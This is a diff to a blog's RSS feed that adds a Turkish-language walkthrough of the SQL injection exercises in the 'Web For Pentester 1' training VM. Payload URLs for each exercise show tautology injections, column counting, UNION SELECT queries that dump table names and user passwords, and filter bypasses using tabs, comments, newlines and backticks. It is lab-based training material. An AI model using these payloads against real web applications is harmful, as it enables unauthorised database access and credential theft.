@@ -6,9 +6,181 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     <description></description>
     <language>en-us</language>
-    <pubDate>Wed, 15 Mar 2017 14:04:02 +0300</pubDate>
-    <lastBuildDate>Wed, 15 Mar 2017 14:04:02 +0300</lastBuildDate>
+    <pubDate>Sat, 18 Mar 2017 00:24:59 +0300</pubDate>
+    <lastBuildDate>Sat, 18 Mar 2017 00:24:59 +0300</lastBuildDate>
 
+    
+      <item>
+        <title>WEB For Pentester 1 - SQL Injections Bölümü Çözümleri</title>
+        <link>http://localhost:4000/wfp1-sql-injection-cozumleri</link>
+        <pubDate>Sat, 18 Mar 2017 00:00:00 +0300</pubDate>
+        <author></author>
+        <description>&lt;p&gt;      &lt;strong&gt;Web For Pentester&lt;/strong&gt; yaygın Web zafiyetlerini bize sunan ve bu zafiyetlerden yararlanmaya çalışarak çözümlere ulaştığımız
+bir test sistemidir. Bu adresten bilgisayarınıza indirebilirsiniz.&lt;a href=&quot;https://www.pentesterlab.com/exercises/web_for_pentester&quot;&gt;https://www.pentesterlab.com/exercises/web_for_pentester&lt;/a&gt;
+ISO kalıbı bilgisayarınıza indikten sonra Vmware,Virtual Machine gibi sanal makina sistemlerinden birine kurmanız gerekir. Kurulumdan sonra sanal makinenizdeki sistem de&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;blockquote&gt;
+    &lt;p&gt;&lt;strong&gt;»&lt;/strong&gt;ifconfig&lt;/p&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;yazarak gördüğünüz IP adresini Ana makinenizdeki tarayıcınıza yazarak &lt;strong&gt;WFP&lt;/strong&gt; sorularına ulaşabilirsiniz.
+Bu yazıda &lt;strong&gt;SQL Injections&lt;/strong&gt; Bölümünün çözümlerini anlatmaya çalışacağız.Syntax yapısını sağlamak için gereken  URL encode karakterlerine şurayı ziyaret ederek ulaşabilirsiniz.
+&lt;a href=&quot;https://www.w3schools.com/tags/ref_urlencode.asp&quot;&gt;https://www.w3schools.com/tags/urlencode&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Example 1&lt;/strong&gt;&lt;br /&gt;
+      Soruda tırnak (‘) koyup deneme yaptığımızda ekranın bir hatadan dolayı değiştiğini görüyoruz. Buradan araya kod sıkıştırabileceğimizi anlıyoruz.  Örnek olarak arka tarafta çalışan sorgu:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. select id,name,age from users where name='root'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Buraya şu ifadeyi eklediğimizde&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. select id,name,age from users where name='root' or 1 or''
+2. select id,name,age from users where 1 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;İkinci  duruma geldiğini düşünebiliriz. Bununla bütün değerleri çağırmış oluyoruz ve listeliyoruz.
+‘or 1 or’ ifadesini aşağıdaki gibi URL’ye eklediğimizde tüm tabloyu listeliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=root'or 1 or'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Burada çıkan kullanıcıları ve bilgileri görüyoruz. Örneğin user1 ile devam edelim. Buraya yazdığımız kelime sonucu etkilemez. Önümüzdeki tabloda kaç tane sütun olduğunu aşağıdaki komutla deneyerek buluyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=user1' order by 1 %23
+2. http://192.168.96.129/sqli/example1.php?name=user1' order by 2 %23
+3. http://192.168.96.129/sqli/example1.php?name=user1' order by 3 %23
+4. http://192.168.96.129/sqli/example1.php?name=user1' order by 4 %23
+5. http://192.168.96.129/sqli/example1.php?name=user1' order by 5 %23
+6. http://192.168.96.129/sqli/example1.php?name=user1' order by 6 %23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Ve en son 6 da hata oluyor yani önümüze hiç bir şey çıkmıyor. Buradan 5 tane sütunumuz olduğunu anlıyoruz.&lt;strong&gt;‘%23’&lt;/strong&gt; ifadesi de (#) anlamına geliyor yani sonrasında gelen ifadeleri yok sayıyor. Bu sayede syntax hatalarından kurtuluyoruz.
+Bu aşamadan sonra bilgi toplamaya başlıyoruz.İlk sütuna ve ikinci sütuna tablo ve versiyon bilgilerini bastırmak için bunu uyguluyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=user1' union select table_name,version(),3,4,5 
+from information_schema.tables %23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Bütün Sütun isimleri için:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=user1' union select column_name,2,3,4,5 
+from information_schema.columns %23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Tablo isimlerini normal yazarak hata alırsak onların hexadecimal karşılıklarını deneyerek sonuca ulaşabiliriz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=root' union select column_name,2,3,4,5 
+from information_schema.columns where table_name = 0x7573657273 %23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Sırayla aşağıdaki işlemleri uygulayarak tablodaki kullanıcı şifrelerini bulmaya çalışalım.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=root' union select 
+database(),2,3,4,5 %23 --&amp;gt; Kullanılan veri tabanının ismini çektiğimiz komut.
+
+2. http://192.168.96.129/sqli/example1.php?name=root' union select table_name,2,3,4,5 
+from information_schema.tables where 
+table_schema = database() %23 --&amp;gt; Kullanılan tablonun adını çektiğimiz komut.
+
+3. http://192.168.96.129/sqli/example1.php?name=root' UNION SELECT 1,column_name,3,4,5 
+FROM information_schema.columns WHERE table_name=&quot;users&quot; %23 --&amp;gt; tablodaki sütunların 
+isimlerini çektiğimiz komut.
+
+4. http://192.168.96.129/sqli/example1.php?name=root' union select name,passwd,3,4,5 
+from exercises.users %23 --&amp;gt; kullanıcı isimlerini ve şifrelerini çektiğimiz komut.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Çeşitli komut varyasyonları ile farklı bilgiler edinebiliriz.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Example 2&lt;/strong&gt;&lt;br /&gt;
+      1. Soruda denediğimiz ifadenin aynısını deniyoruz ve &lt;strong&gt;‘ERROR NO SPACE’&lt;/strong&gt; yazısını görüyoruz. Buradan aralara
+koyduğumuz boşluk karakterinin sorun oluşturduğunu anlıyoruz.  Syntax yapısını sağlamak için boşluk yerine tab koyabiliriz. Tabiki Tab tuşuna basarak yapabildiğimiz bir olay değil. TAB karakteri &lt;strong&gt;‘%09’&lt;/strong&gt; ile ifade edilir.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example2.php?name=root'or%091%09or'	
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Example 3&lt;/strong&gt;&lt;br /&gt;
+      ‘or 1 or’ denediğimizde  &lt;strong&gt; ‘ERROR NO SPACE’ &lt;/strong&gt;. Sonrasında bir önceki sorudaki gibi  ‘or%091%09or’ deniyoruz fakat yine aynı sonuç : &lt;strong&gt;‘ERROR NO SPACE’&lt;/strong&gt; . Boşluğa ve Tab’a izin vermiyor. Syntax yapısını sağlaması için boşluk benzeri birşey koyacağız ama ne boşluk olacak ne de tab. Biraz araştırma sonucu yorum satırı haline getirerek oralardaki karakter koyma ihtiyacından kurtuluyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example3.php?name=root'or/**/1/**/or
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Example 4&lt;/strong&gt;&lt;br /&gt;
+      URL’nin devamına ‘or 1 or’ denediğimizde bir sonuç alamıyoruz. Birkaç denemeden sonra tırnak karakteri kullanmamamız gerektiğini anlıyoruz ve yalnızca &lt;strong&gt;or 1&lt;/strong&gt; yazarak sonuçlari listeliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example4.php?id=2 or 1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Example 5&lt;/strong&gt;&lt;br /&gt;
+      4. soruda olduğu gibi aynı işlemi uygulayınca sonucu listeliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example5.php?id=2 or 1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Example 6&lt;/strong&gt;&lt;br /&gt;
+      Tırnak koyup bir kontrol ediyoruz ve &lt;strong&gt;‘ERROR INTEGER REQUIRED’&lt;/strong&gt; yazısını görüyoruz. İfademizi bir Integer ile bitirmek için  or 1  yazıyoruz .&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example6.php?id=2 or 1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Example 7&lt;/strong&gt;&lt;br /&gt;
+      Tırnak karakteri koyduğumuzda &lt;strong&gt;‘ERROR INTEGER REQUIRED’&lt;/strong&gt; yazısını görüyoruz. Bir önceki soruda olduğu gibi or 1 yazıp deniyoruz ama aynı hata devam ediyor. Burada integer isteyen yerin bizim ifademizden önce gelen yer olduğunu deneyerek buluyoruz.&lt;strong&gt;‘%0A’&lt;/strong&gt; karakteri alt satıra geçme anlamına geliyor. Bunu kullanarak aşağıdaki ifade sonuçları listeliyor.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example7.php?id=2%0A or 1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Example 8&lt;/strong&gt;&lt;br /&gt;
+      Burada &lt;strong&gt;order&lt;/strong&gt; kelimesini görünce order yapısıyla ilgili sorgular göndermeye çalışıyoruz. Düz tırnak gönderdiğimizde bir sonuç alamıyoruz ve denemeler sonucu yatay tırnak(`) kullanıyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. `asc %23
+2. `desc %23
+3. ` %23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;ifadeleri işimizi görüyor.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example8.php?order=name`asc %23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Example 9&lt;/strong&gt;&lt;br /&gt;
+      Düz tırnak ve yatay tırnak karakterleri hata veriyor ve bunları kullanmadan deneyerek sonuçları listeliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. asc %23
+2. desc %23
+3. %23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;İfadelerinden herhangi biriyle sorgumuzu çalıştırıyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example9.php?order=name desc %23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;
+      Böylelikle &lt;strong&gt;WEB For Pentester 1 SQL Injections&lt;/strong&gt; bölümünün çözümünü tamamlamış olduk. Tüm sorular için aynı detaya inme gereği duymadık ilk sorudaki sorgulardan yola çıkarak aynı sonuçları elde edebilirsiniz.&lt;/p&gt;
+
+</description>
+      </item>
     
       <item>
         <title>PHP ve Perl Kullanarak HttpApi Oluşturma</title>
